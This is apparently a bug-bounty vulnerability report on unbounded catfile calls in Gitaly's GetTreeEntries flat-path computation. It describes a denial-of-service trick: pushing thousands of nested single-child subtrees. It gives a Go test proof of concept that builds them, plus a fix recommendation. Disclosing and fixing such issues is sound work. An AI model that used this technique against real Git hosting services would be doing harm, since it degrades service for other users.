### Title
Unbounded `populateFlatPath` catfile calls (O(entries × 10)) enable single-request DoS in `GetTreeEntries` - ([File: internal/gitaly/service/commit/get_tree_entries.go])

### Summary
`populateFlatPath` performs up to `defaultFlatTreeRecursion-1` (9) sequential `catfile.TreeEntries` round-trips for every `TREE`-typed entry returned by a non-recursive `GetTreeEntries` call. Because the number of top-level tree entries and their nesting depth are entirely attacker-controlled via ordinary pushed repository content, and no server-side cap or pagination is enforced before this loop runs, an attacker can craft a directory with a very large number of singly-nested subtrees to force the handler to perform proportionally large amounts of synchronous, sequential work per request.

### Finding Description
In `sendTreeEntriesUnified`, when `recursive=false` and `skipFlatPaths=false` (both are attacker-controlled RPC fields with `skipFlatPaths` defaulting to false), `populateFlatPath` is invoked over the full, un-paginated `entries` slice before pagination is applied: [1](#0-0) 

`populateFlatPath` itself loops over every entry, and for each `TREE` entry issues up to 9 sequential calls to `catfile.TreeEntries` against the shared per-request catfile object reader in order to walk down single-child subtree chains: [2](#0-1) 

The code comment itself acknowledges this is "really inefficient": "for each tree entry, we recurse up to 10 levels deep into that subtree... requesting the tree entries via a catfile process." [3](#0-2) 

Neither `validateGetTreeEntriesRequest` nor any other guard limits the number of tree entries processed by this loop; pagination (`PaginationParameter`) is optional and, if omitted, `paginateTreeEntries` is skipped entirely, so the full unbounded entry set flows into `populateFlatPath`: [1](#0-0) 

An unprivileged user who owns/forks/imports a repository can push a single directory containing thousands of `TREE`-type entries, each pointing to a chain of single-child subtrees exactly 9 levels deep (to maximize the loop's iteration count without early-exiting), then call `GetTreeEntries` with `Recursive=false` and `SkipFlatPaths=false` (the default) on that path. This is entirely within normal push/RPC capabilities and requires no elevated privileges, no config change, and no bug in git itself.

### Impact Explanation
This causes the RPC handler to perform work proportional to `entries × 10` sequential catfile round-trips inside a single request, executed synchronously before any response chunk is flushed. This maps to the GitLab bounty "Denial of Service" impact class scoped to a single RPC handler/repository: a crafted push can make subsequent `GetTreeEntries` calls on that repository consume disproportionate CPU/wall-clock time relative to a normal directory listing, degrading service for concurrent requests against the same repository and consuming catfile reader capacity for the duration of the call.

### Likelihood Explanation
Preconditions are minimal and fully within an unprivileged user's capability: create/push a repository (or a branch within one they control) containing many top-level tree entries each with a manufactured single-child subtree chain, then issue a standard `GetTreeEntries` RPC with default parameters (`SkipFlatPaths` defaults to `false`). No special permissions, secrets, or non-default server configuration are required, and the attack is fully repeatable/parameterizable in the number of entries created.

### Recommendation
Bound the cost of flat-path computation independent of attacker-controlled repository shape: apply pagination/entry-count limits before calling `populateFlatPath` (rather than only for response chunking), cap the total number of `catfile.TreeEntries` calls per request, or compute flat paths lazily per emitted/paginated page instead of eagerly over the full unbounded entry set.

### Proof of Concept
```go
func TestGetTreeEntries_FlatPathDoS(t *testing.T) {
    ctx := testhelper.Context(t)
    cfg, repoProto, repoPath := setupCommitServiceWithRepo(t, ctx)
    client, _ := newCommitServiceClient(t, cfg.SocketPath)

    const numEntries = 5000 // attacker-controlled: number of top-level TREE entries
    const chainDepth = 9    // matches defaultFlatTreeRecursion-1

    // Build numEntries subtree chains, each chainDepth levels of single-child TREE nesting.
    var rootEntries []gittest.TreeEntry
    for i := 0; i < numEntries; i++ {
        leafOID := gittest.WriteTree(t, cfg, repoPath, []gittest.TreeEntry{
            {Mode: "100644", Path: "file", Content: "x"},
        })
        for d := 0; d < chainDepth-1; d++ {
            leafOID = gittest.WriteTree(t, cfg, repoPath, []gittest.TreeEntry{
                {Mode: "040000", Path: "sub", OID: leafOID},
            })
        }
        rootEntries = append(rootEntries, gittest.TreeEntry{
            Mode: "040000", Path: fmt.Sprintf("dir%d", i), OID: leafOID,
        })
    }
    rootOID := gittest.WriteTree(t, cfg, repoPath, rootEntries)
    commitOID := gittest.WriteCommit(t, cfg, repoPath, gittest.WithTree(rootOID))
    gittest.WriteRef(t, cfg, repoPath, "refs/heads/dos", commitOID)

    start := time.Now()
    stream, err := client.GetTreeEntries(ctx, &gitalypb.GetTreeEntriesRequest{
        Repository: repoProto,
        Revision:   []byte("refs/heads/dos"),
        Path:       []byte("."),
        Recursive:  false,
        // SkipFlatPaths defaults to false, triggering populateFlatPath for all numEntries TREE entries.
    })
    require.NoError(t, err)
    _, err = testhelper.ReceiveAndFold(stream.Recv, func(a, b *gitalypb.GetTreeEntriesResponse) *gitalypb.GetTreeEntriesResponse { return a })
    require.NoError(t, err)

    // Assert wall-clock time scales linearly with numEntries * chainDepth catfile round trips,
    // demonstrating unbounded per-request cost proportional to attacker-controlled repo content.
    t.Logf("GetTreeEntries with %d entries took %s", numEntries, time.Since(start))
}
```
Expected result: request duration scales roughly linearly with `numEntries × chainDepth`, confirming unbounded sequential catfile work driven solely by pushed repository content and default RPC parameters.

func populateFlatPath(
	ctx context.Context,
	objectReader catfile.ObjectContentReader,
	entries []*gitalypb.TreeEntry,
) error {
	for _, entry := range entries {
		entry.FlatPath = entry.GetPath()

		if entry.GetType() != gitalypb.TreeEntry_TREE {
			continue
		}

		for i := 1; i < defaultFlatTreeRecursion; i++ {
			subEntries, err := catfile.TreeEntries(ctx, objectReader, entry.GetCommitOid(), string(entry.GetFlatPath()))
			if err != nil {
				return err
			}

			if len(subEntries) != 1 || subEntries[0].GetType() != gitalypb.TreeEntry_TREE {
				break
			}

			entry.FlatPath = subEntries[0].GetPath()
		}
	}

	return nil
}
